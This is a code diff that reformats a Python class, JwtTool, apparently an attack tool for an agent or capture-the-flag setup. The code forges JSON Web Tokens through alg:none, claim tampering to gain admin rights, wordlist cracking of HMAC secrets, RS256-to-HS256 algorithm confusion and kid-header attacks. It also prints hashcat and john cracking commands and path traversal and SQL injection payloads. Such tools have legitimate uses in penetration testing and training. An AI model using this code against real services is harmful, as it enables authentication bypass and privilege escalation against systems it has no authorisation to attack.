@@ -117,7 +117,9 @@ class JwtTool:
         try:
             data = json.loads(tool_input) if tool_input else {}
         except json.JSONDecodeError as exc:
-            return f"[JwtTool] Error: tool_input must be JSON. Decoding failed with: {exc}"
+            return (
+                f"[JwtTool] Error: tool_input must be JSON. Decoding failed with: {exc}"
+            )
 
         operation = data.get("operation", "").lower().strip()
         if not operation:
@@ -166,7 +168,9 @@ class JwtTool:
         padded = data + "=" * (4 - len(data) % 4) if len(data) % 4 != 0 else data
         return base64.urlsafe_b64decode(padded)
 
-    def _parse_jwt(self, token: str) -> Tuple[Optional[Dict], Optional[Dict], Optional[str]]:
+    def _parse_jwt(
+        self, token: str
+    ) -> Tuple[Optional[Dict], Optional[Dict], Optional[str]]:
         """Parse JWT into header, payload, signature. Returns (header, payload, signature)."""
         if not token:
             return None, None, None
@@ -213,11 +217,15 @@ class JwtTool:
 
             # Flag potential vulnerabilities
             if alg.lower() == "none":
-                result += "[!] VULNERABLE: Algorithm is 'none' - no signature verification!\n"
+                result += (
+                    "[!] VULNERABLE: Algorithm is 'none' - no signature verification!\n"
+                )
             elif alg.upper() in ["HS256", "HS384", "HS512"]:
                 result += "[*] Uses symmetric HMAC signing - secret may be crackable\n"
             elif alg.upper() in ["RS256", "RS384", "RS512"]:
-                result += "[*] Uses asymmetric RSA signing - check for algorithm confusion\n"
+                result += (
+                    "[*] Uses asymmetric RSA signing - check for algorithm confusion\n"
+                )
             result += "\n"
         else:
             result += "=== HEADER ===\n[Could not decode header]\n\n"
@@ -228,7 +236,18 @@ class JwtTool:
 
             # Highlight interesting claims
             interesting_claims = []
-            for key in ["admin", "role", "isAdmin", "is_admin", "user", "username", "sub", "iat", "exp", "nbf"]:
+            for key in [
+                "admin",
+                "role",
+                "isAdmin",
+                "is_admin",
+                "user",
+                "username",
+                "sub",
+                "iat",
+                "exp",
+                "nbf",
+            ]:
                 if key in payload:
                     interesting_claims.append(f"{key}: {payload[key]}")
 
@@ -246,7 +265,9 @@ class JwtTool:
                 result += "[EMPTY - possible alg:none attack!]\n"
             else:
                 result += f"[Present, {len(signature)} chars]\n"
-                result += f"Raw: {signature[:50]}{'...' if len(signature) > 50 else ''}\n"
+                result += (
+                    f"Raw: {signature[:50]}{'...' if len(signature) > 50 else ''}\n"
+                )
 
         return result
 
@@ -271,14 +292,18 @@ class JwtTool:
             new_header = dict(header)
             new_header["alg"] = variant
 
-            header_b64 = self._b64_url_encode(json.dumps(new_header, separators=(",", ":")).encode())
-            payload_b64 = self._b64_url_encode(json.dumps(payload, separators=(",", ":")).encode())
+            header_b64 = self._b64_url_encode(
+                json.dumps(new_header, separators=(",", ":")).encode()
+            )
+            payload_b64 = self._b64_url_encode(
+                json.dumps(payload, separators=(",", ":")).encode()
+            )
 
             # Variants: with empty sig, with dot but no sig, without trailing dot
             forged_tokens = [
-                f"{header_b64}.{payload_b64}.",       # Standard with trailing dot
-                f"{header_b64}.{payload_b64}",        # No trailing dot
-                f"{header_b64}.{payload_b64}..",      # Double dot
+                f"{header_b64}.{payload_b64}.",  # Standard with trailing dot
+                f"{header_b64}.{payload_b64}",  # No trailing dot
+                f"{header_b64}.{payload_b64}..",  # Double dot
             ]
 
             results.append((variant, forged_tokens[0]))  # Just use standard one
@@ -305,7 +330,9 @@ class JwtTool:
             return "[JwtTool] Error: 'token' is required for modify_claim operation."
 
         if not claims:
-            return "[JwtTool] Error: 'claims' dict is required for modify_claim operation."
+            return (
+                "[JwtTool] Error: 'claims' dict is required for modify_claim operation."
+            )
 
         header, payload, _ = self._parse_jwt(token)
 
@@ -327,8 +354,12 @@ class JwtTool:
             result += f"  {k}: {old_val} -> {v}\n"
         result += "\n"
 
-        header_b64 = self._b64_url_encode(json.dumps(header, separators=(",", ":")).encode())
-        payload_b64 = self._b64_url_encode(json.dumps(payload, separators=(",", ":")).encode())
+        header_b64 = self._b64_url_encode(
+            json.dumps(header, separators=(",", ":")).encode()
+        )
+        payload_b64 = self._b64_url_encode(
+            json.dumps(payload, separators=(",", ":")).encode()
+        )
 
         if key:
             # Sign with provided key
@@ -350,13 +381,19 @@ class JwtTool:
             # alg:none variant
             none_header = dict(header)
             none_header["alg"] = "none"
-            none_header_b64 = self._b64_url_encode(json.dumps(none_header, separators=(",", ":")).encode())
+            none_header_b64 = self._b64_url_encode(
+                json.dumps(none_header, separators=(",", ":")).encode()
+            )
             result += f"--- alg:none variant ---\n{none_header_b64}.{payload_b64}.\n\n"
 
             # Original alg but no signature (sometimes works)
-            result += f"--- Original alg, no signature ---\n{header_b64}.{payload_b64}.\n\n"
+            result += (
+                f"--- Original alg, no signature ---\n{header_b64}.{payload_b64}.\n\n"
+            )
 
-            result += "TIP: If you know the secret key, provide it with 'key' parameter.\n"
+            result += (
+                "TIP: If you know the secret key, provide it with 'key' parameter.\n"
+            )
 
         return result
 
@@ -365,11 +402,17 @@ class JwtTool:
         signing_input = f"{header_b64}.{payload_b64}"
 
         if alg == "HS256":
-            sig = hmac.new(key.encode(), signing_input.encode(), hashlib.sha256).digest()
+            sig = hmac.new(
+                key.encode(), signing_input.encode(), hashlib.sha256
+            ).digest()
         elif alg == "HS384":
-            sig = hmac.new(key.encode(), signing_input.encode(), hashlib.sha384).digest()
+            sig = hmac.new(
+                key.encode(), signing_input.encode(), hashlib.sha384
+            ).digest()
         elif alg == "HS512":
-            sig = hmac.new(key.encode(), signing_input.encode(), hashlib.sha512).digest()
+            sig = hmac.new(
+                key.encode(), signing_input.encode(), hashlib.sha512
+            ).digest()
         else:
             raise ValueError(f"Unsupported algorithm for signing: {alg}")
 
@@ -430,20 +473,26 @@ class JwtTool:
             else:
                 sample_payload["admin"] = True
 
-            new_payload_b64 = self._b64_url_encode(json.dumps(sample_payload, separators=(",", ":")).encode())
+            new_payload_b64 = self._b64_url_encode(
+                json.dumps(sample_payload, separators=(",", ":")).encode()
+            )
             new_sig = self._sign(header_b64, new_payload_b64, secret, alg)
             forged = f"{header_b64}.{new_payload_b64}.{new_sig}"
 
             result += f"\n[Sample forged token with admin claim]:\n{forged}\n"
         else:
             result += "[*] No secret found in wordlist.\n"
-            result += "TIP: Try a larger wordlist or use hashcat/john for offline cracking:\n"
+            result += (
+                "TIP: Try a larger wordlist or use hashcat/john for offline cracking:\n"
+            )
             result += f"  hashcat -m 16500 '{token}' wordlist.txt\n"
-            result += f"  john --wordlist=wordlist.txt --format=HMAC-SHA256 jwt.txt\n"
+            result += "  john --wordlist=wordlist.txt --format=HMAC-SHA256 jwt.txt\n"
 
         return result
 
-    def _forge_with_key(self, claims: Dict[str, Any], key: str, algorithm: str = "HS256") -> str:
+    def _forge_with_key(
+        self, claims: Dict[str, Any], key: str, algorithm: str = "HS256"
+    ) -> str:
         """Create a new JWT with given claims and key."""
         if not claims:
             return "[JwtTool] Error: 'claims' dict is required for forge_with_key operation."
@@ -457,8 +506,12 @@ class JwtTool:
 
         header = {"alg": algorithm, "typ": "JWT"}
 
-        header_b64 = self._b64_url_encode(json.dumps(header, separators=(",", ":")).encode())
-        payload_b64 = self._b64_url_encode(json.dumps(claims, separators=(",", ":")).encode())
+        header_b64 = self._b64_url_encode(
+            json.dumps(header, separators=(",", ":")).encode()
+        )
+        payload_b64 = self._b64_url_encode(
+            json.dumps(claims, separators=(",", ":")).encode()
+        )
 
         try:
             signature = self._sign(header_b64, payload_b64, key, algorithm)
@@ -502,7 +555,9 @@ class JwtTool:
         result += f"Algorithm: {alg}\n\n"
 
         if alg.lower() == "none":
-            vulnerabilities.append("CRITICAL: Algorithm is 'none' - token accepts any payload!")
+            vulnerabilities.append(
+                "CRITICAL: Algorithm is 'none' - token accepts any payload!"
+            )
         elif alg.upper() in ["HS256", "HS384", "HS512"]:
             info.append(f"Uses HMAC ({alg}) - may be vulnerable to weak secret attacks")
             info.append("Try 'crack' operation to bruteforce the secret")
@@ -512,13 +567,24 @@ class JwtTool:
 
         # Check for missing or empty signature
         if signature is None or signature == "" or signature == ".":
-            vulnerabilities.append("Signature is empty/missing - possible alg:none vulnerability")
+            vulnerabilities.append(
+                "Signature is empty/missing - possible alg:none vulnerability"
+            )
 
         # Payload analysis
         result += "=== Payload Analysis ===\n"
 
         # Check for privilege-related claims
-        priv_claims = ["admin", "role", "isAdmin", "is_admin", "superuser", "root", "privilege", "level"]
+        priv_claims = [
+            "admin",
+            "role",
+            "isAdmin",
+            "is_admin",
+            "superuser",
+            "root",
+            "privilege",
+            "level",
+        ]
         found_priv = {k: payload.get(k) for k in priv_claims if k in payload}
         if found_priv:
             result += f"Privilege claims found: {json.dumps(found_priv)}\n"
@@ -533,6 +599,7 @@ class JwtTool:
 
         # Check timestamps
         import time
+
         now = int(time.time())
 
         if "exp" in payload:
@@ -559,12 +626,16 @@ class JwtTool:
             kid = header["kid"]
             vulnerabilities.append(f"'kid' header present: {kid}")
             info.append("kid may be vulnerable to SQL injection or path traversal")
-            info.append("Try: kid: \"../../../dev/null\" or kid: \"' UNION SELECT 'secret'--\"")
+            info.append(
+                'Try: kid: "../../../dev/null" or kid: "\' UNION SELECT \'secret\'--"'
+            )
 
         # Check for jku (JWK Set URL) - possible SSRF
         if "jku" in header:
             vulnerabilities.append(f"'jku' header present: {header['jku']}")
-            info.append("jku may allow SSRF - try pointing to your server with custom JWKS")
+            info.append(
+                "jku may allow SSRF - try pointing to your server with custom JWKS"
+            )
 
         # Output
         result += "\n=== Vulnerabilities ===\n"
@@ -660,7 +731,9 @@ class JwtTool:
             result += "=== How it works ===\n"
             result += "1. Server expects RS256 (asymmetric): verify with PUBLIC key\n"
             result += "2. We changed alg to HS256 (symmetric): verify with SECRET key\n"
-            result += "3. If server uses same key for both, it will use the PUBLIC key\n"
+            result += (
+                "3. If server uses same key for both, it will use the PUBLIC key\n"
+            )
             result += "   as the HMAC secret — which we know!\n"
         except Exception as e:
             result += f"[!] Error creating forged token: {e}\n"
@@ -722,7 +795,9 @@ class JwtTool:
 
         # Custom kid value if provided
         if kid_value:
-            attacks.insert(0, ("custom", kid_value, key or "", f"Custom kid: {kid_value}"))
+            attacks.insert(
+                0, ("custom", kid_value, key or "", f"Custom kid: {kid_value}")
+            )
 
         result += f"Original payload: {json.dumps(payload, indent=2)}\n\n"
         result += "=== Generated Attack Tokens ===\n\n"
